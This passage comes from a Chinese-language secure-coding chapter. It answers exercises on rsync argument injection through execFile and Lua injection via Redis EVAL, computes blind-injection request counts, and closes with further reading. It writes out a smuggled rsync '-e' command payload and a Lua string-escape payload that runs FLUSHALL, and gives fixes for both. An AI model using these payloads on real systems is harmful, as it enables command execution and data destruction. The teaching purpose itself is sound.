   - `execFile` 雖然繞開了 `/bin/sh` 的 Shell Parser，但 `rsync` 執行檔一啟動，它自己的命令列參數解析器還是會掃描 `argv[]` 裡每一個以 `-` 或 `--` 開頭的字串。攻擊者只要把 `userSourcePath` 設成 `-e 'sh -c "id > /tmp/pwn"'`（或 `--rsh=...`），`rsync` 就會把它當成指定遠端連線 Shell 的控制旗標，直接執行攻擊者指定的指令。
   - **修法**：第一，在固定選項後面、所有外部位置參數前面，明確加上 POSIX 選項終止符 `'--'`，改成 `execFile('rsync', ['-a', '--', userSourcePath, '/var/backups/sync/'])`，告訴 `rsync` 後面的參數一律不准當成 `-` 旗標解析；第二，在進 `execFile` 前先用路徑解析與白名單嚴格驗證 `userSourcePath` 必須落在允許的工作目錄內。
3. **Redis 兩層解析器的盲點**：
   - Multibulk 協定保護的只有第一層「Redis 指令傳輸層」，它只保證整段 Lua 程式碼會被當成單一字串參數安全送達 Redis 的 `EVAL` 指令。
   - 但 Redis 收到這個字串後，馬上會把它丟給肚子裡的**第二層解析器——Lua 直譯器**去重新做詞法與語法分析！你在組裝 Lua 程式碼時用字串拼接塞入 `${req.body.note}`，攻擊者只要傳入 `' ) .. redis.call('FLUSHALL') .. ('`，就在 Lua 的 AST 裡逃出了字串引號並執行任意的 `redis.call()`。正確寫法是讓 Lua 腳本維持純靜態字串，把 `req.body.note` 放進 `ARGV[1]` 傳入：`redis.eval("return redis.call('SET', KEYS[1], ARGV[1])", 1, key, req.body.note)`。
4. **盲注請求次數實算**：
   - Base64URL 的字元集大小是 $N = 64 = 2^6$。用二分搜尋每次把候選範圍折半，鎖定單一字元固定需要 $\log_2(64) = 6$ 次比較請求。
   - 總共要偷 20 個字元，所以精確需要 `20 × 6 = 120` 次請求（對比一下：如果傻傻用線性掃描逐一比對確認，每個字元平均要試 $(1+64)/2 = 32.5$ 次，20 個字元平均得發 `20 × 32.5 = 650` 次請求，二分搜尋直接省下了超過八成的流量與等待時間）。

---

## 延伸閱讀

- **PortSwigger Web Security Academy — SQL injection / Server-side template injection / OS command injection**（https://portswigger.net/web-security）：最完整的免費線上靶場，強烈建議把本章談到的盲注二分搜尋跟 SSTI 物件反射搬上去實際打過一輪。
- **PostgreSQL Documentation — Message Flow (Extended Query Protocol)**（https://www.postgresql.org/docs/current/protocol-flow.html）：從官方協定規範看懂 `Parse`、`Bind`、`Execute` 三個階段是怎麼在底層把 SQL 語法樹跟參數資料值徹底切開的。
- **Redis Serialization Protocol (RESP) Specification**（https://redis.io/docs/latest/develop/reference/protocol-spec/）：對照線路層的 Inline Command 與 Multibulk 格式，理解為什麼長度前綴（Length-prefixed）能從根源消滅換行定界符注入。
- **GTFOBins & Argument Injection 研究彙整**（https://gtfobins.github.io/）：系統性盤點了 `git`、`tar`、`rsync`、`find`、`curl` 等常見 Unix CLI 工具身上有哪些能拿來讀檔、寫檔甚至執行指令的危險旗標，看完就會明白為什麼單靠 `execFile` 還不夠安全。

